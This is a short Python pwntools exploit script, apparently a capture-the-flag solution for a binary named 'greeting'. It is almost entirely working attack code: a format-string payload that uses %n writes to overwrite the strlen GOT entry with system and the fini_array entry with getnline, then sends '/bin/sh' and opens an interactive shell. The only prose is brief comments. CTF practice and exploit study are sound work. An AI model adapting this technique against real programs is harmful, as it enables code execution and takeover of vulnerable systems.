from pwn import *

context.binary = './greeting'
io = process('./greeting')
# gdb.attach(io, gdbscript = '''
#     # b *0x0804864f
#     # b *0x8048677
#     b getnline
# ''')
elf = ELF('./greeting')

FINI_ARR_ADDR = 0x08049934
STRLEN_GOT_ADDR = 0x08049a54
SYSTEM_SYM_ADDR = 0x08048490
GETNLINE_SYM_ADDR = 0x08048614

# overwrite strlen got_addr w/ system
# && overwrite fini_addr with getnline
payload = b'AA' # we control the 12th formatter offset after 2 padding bytes
payload += p32(STRLEN_GOT_ADDR)
payload += p32(FINI_ARR_ADDR)
payload += b'%134513780x' # this'll take a while
payload += b'%12$n' # write system addr to strlen got
payload += b'%388x'
payload += b'%13$n' # write getnline to fini_arr
log.info(f'Length of payload: {len(payload)}')

io.sendline(payload)
io.sendline(b'/bin/sh')
p = log.progress("Sending payload...")
io.clean()
p.success("Got Shell!")
io.interactive()
